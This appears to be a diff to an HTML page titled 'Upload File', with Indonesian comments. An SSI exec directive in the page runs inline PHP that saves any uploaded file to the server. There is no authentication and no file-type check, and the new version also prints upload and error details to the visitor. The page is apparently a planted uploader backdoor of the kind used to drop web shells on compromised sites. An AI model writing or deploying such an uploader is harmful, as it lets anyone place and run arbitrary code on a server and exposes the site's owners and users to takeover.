@@ -9,22 +9,41 @@
             font-family: Sedgwick Ave;
             text-align: center;
         }
+        input, button {
+            font-family: Sedgwick Ave;
+            margin: 10px;
+        }
     </style>
 </head>
 <body>
     <h1>Upload File</h1>
-    <!-- Form untuk mengunggah file -->
+    <!-- Form Upload File -->
     <form method="post" enctype="multipart/form-data">
         <input type="file" name="f" required>
-        <input name="k" type="submit" id="k" value="upload">
+        <button name="k" type="submit" value="upload">Upload</button>
     </form>
     <br>
     <!-- Proses dan Tampilkan Hasil -->
-    <!--#exec cmd="php -r 'if ($_SERVER[\"REQUEST_METHOD\"] === \"POST\" && isset($_POST[\"k\"]) && $_POST[\"k\"] === \"upload\") { 
-        if (isset($_FILES[\"f\"]) && @copy($_FILES[\"f\"][\"tmp_name\"], $_FILES[\"f\"][\"name\"])) {
-            echo \"<b>\" . htmlspecialchars($_FILES[\"f\"][\"name\"]) . \" berhasil diupload.</b>\";
+    <!--#exec cmd="php -r '
+    if ($_SERVER[\"REQUEST_METHOD\"] === \"POST\" && isset(\$_POST[\"k\"]) && \$_POST[\"k\"] === \"upload\") {
+        echo \"<pre>\"; // Debugging informasi file
+        print_r(\$_FILES); 
+        echo \"</pre>\";
+        if (isset(\$_FILES[\"f\"])) {
+            \$uploadDir = __DIR__ . \"/uploads/\"; // Direktori penyimpanan
+            if (!file_exists(\$uploadDir)) {
+                mkdir(\$uploadDir, 0755, true); // Buat direktori jika belum ada
+            }
+            \$filePath = \$uploadDir . basename(\$_FILES[\"f\"][\"name\"]);
+            if (@copy(\$_FILES[\"f\"][\"tmp_name\"], \$filePath)) {
+                echo \"<b>\" . htmlspecialchars(\$_FILES[\"f\"][\"name\"]) . \" berhasil diupload ke direktori uploads.</b>\";
+            } else {
+                echo \"<b>Gagal upload Bjirr..</b>\";
+                echo \"<pre>Error: \"; print_r(error_get_last()); echo \"</pre>\";
+            }
         } else {
-            echo \"<b>Gagal upload Bjirr..</b>\";
-        }}'" -->
+            echo \"<b>Tidak ada file yang dipilih.</b>\";
+        }
+    }'" -->
 </body>
 </html>
